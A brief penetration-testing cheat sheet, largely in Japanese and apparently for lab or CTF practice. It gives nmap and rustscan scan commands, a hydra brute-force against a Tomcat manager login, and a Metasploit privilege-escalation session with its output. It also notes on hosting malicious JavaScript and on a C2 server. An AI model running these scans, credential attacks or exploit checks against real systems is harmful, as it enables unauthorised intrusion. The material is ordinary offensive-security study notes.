# Cheat Sheet


## Portscan

### nmap
- 全ポートスキャン: `nmap -sS -A -T4 -Pn -p- $IP`
- 特定ポートのチェック: `sudo nmap -sS -A -p[port] --script vuln $IP`

### rustscan
- installation: `sudo snap install -y rustscan`
- 全ポートスキャン: `rustscan -a $IP -- -Pn -A`

## Password Cracking

### hydra
- webサービスで総当たりする，
- Basic認証総当たり(`user:pass`形式のコーパス): `hydra -C ~/tools/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-post://$IP:8080/manager/html`


## Exploitation

### msfvenom
- metasploitのペイロードを取れる
- ペイロードの列挙: `msfvenom -l payloads`


## Privesc
### local exploit suggester
- meterpreter shell をバックグラウンドに移し、```use post/multi/recon/local_exploit_suggester``` する
- sesionオプションを指定し、run 
  ```msf6 exploit(windows/iis/iis_webdav_upload_asp) > use post/multi/recon/local_exploit_suggester
  msf6 post(multi/recon/local_exploit_suggester) > options

  Module options (post/multi/recon/local_exploit_suggester):

     Name             Current Setting  Required  Description
     ----             ---------------  --------  -----------
     SESSION                           yes       The session to run this module on
     SHOWDESCRIPTION  false            yes       Displays a detailed description for the available e
                                                 xploits

  msf6 post(multi/recon/local_exploit_suggester) > set session 3
  session => 3
  msf6 post(multi/recon/local_exploit_suggester) > run

  [*] 10.10.10.15 - Collecting local exploits for x86/windows...
  [*] 10.10.10.15 - 37 exploit checks are being tried...
  [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  [*] Post module execution completed
  ```



## Reverse shells

### SimpleHTTPserver
- カレントディレクトリをルートとした簡易Webサーバを立てることができる．
  - ```sudo python -m SimpleHTTPServer [port]```
- 対象サーバで```<script src="http://.../a.js">```により任意の悪意のあるJavaScriptを実行させることなどが可能

### SilentTrinity
- C2 server を立てることができる
